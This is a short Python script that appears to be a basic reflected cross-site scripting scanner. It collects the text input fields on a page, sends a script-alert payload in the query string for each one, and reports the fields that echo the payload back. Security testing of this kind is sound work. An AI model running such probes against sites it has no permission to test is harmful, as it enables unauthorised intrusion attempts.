import requests
import re

url = "https://example.com/"
payload = "<script>alert('XSS')</script>"

response = requests.get(url)
content = response.content.decode('utf-8')

matches = re.findall(r"(<input.*?>)", content)

for match in matches:
    if "type=\"text\"" in match:
        name = re.search(r"name=\"(.*?)\"", match).group(1)
        input_id = re.search(r"id=\"(.*?)\"", match).group(1)
        payload_url = url + f"?{name}={payload}"
        payload_response = requests.get(payload_url)
        payload_content = payload_response.content.decode('utf-8')
        if payload in payload_content:
            print(f"Potential XSS vulnerability found in input field with name {name} and ID {input_id}.")
